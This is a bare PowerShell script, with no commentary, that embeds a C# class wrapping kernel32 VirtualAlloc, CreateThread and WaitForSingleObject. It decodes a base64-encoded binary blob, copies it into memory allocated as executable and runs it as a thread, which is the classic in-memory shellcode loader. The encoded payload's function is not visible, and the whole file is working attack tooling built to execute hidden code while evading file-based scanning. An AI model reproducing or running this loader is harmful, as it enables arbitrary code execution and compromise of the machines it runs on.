
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 
{
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}
"@
    
    Add-Type $Kernel32
    [Byte[]] $buf = [System.Convert]::FromBase64String("TTHbVEFdZkGB5TD4Sb8sSTHrv53JJtn3QbM/SQ+uRQBJg8UISYt9AEn/y04xfN8fTYXbdfN4BAAG/sIS9mT0pM601XEo2iRXqj56ad5t/AmisDPOb6+OOaY0koDZ4QIAh1awhKPBPMI2q0TIF8dlnDckBZ+Rj7CmkyLwwB/H76s3lTjEnpCOFf1fnsgVb78UgVDasOrzkRT7SONyWX3vlzDhnLn55ma8QI0yNqM7+EpLw0aUY3UbrDDVUXCO+7i4+m8yxsB2ga2YSja84ElDg+OrluFnTimfmucgkQmcDZ8UM5cKItZsLmKon1jq0u2CUZjeGs/K7YMtk59mEGTCg1ero6ROGSMkwuHQObJR4ZFzWUJo5BmREldBm2vSGSuSKkGba5IZK7JiQR+O+Bvt8ftBIfkebcG8MCUweHOYrYEzyPLU4BDxiLlbMLLwbejB4oKQsbJRoIi3yWRe+lBwkLlBCH05EYCJM9nzb/quaYG5PZhxs4ft8ftBIfkeEGEJP0gR+Iqx1TF+ClwduhSZEUfRSH05EYSJM9l2eDld6IS5SQxws4HhSzaBWDhiEPiBaldJY/MJ4ZlzU1i6XnHhks3pSHjrC+hLIOBHxk2u/YiICBA5slGgwDJBnbSzUKDAc7Mhst3WXxWJ6Q0TuBAaZqe0jcZnGSMEGjUWRbjRWyBHDKt+oSPPqjJQUbBornWjU2VzF9cpxcCaNaR7kb47SuDTz8zXFikez/ffiPA=")
    $size = $buf.Length
    [IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);
    [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
    $thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
    [Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")

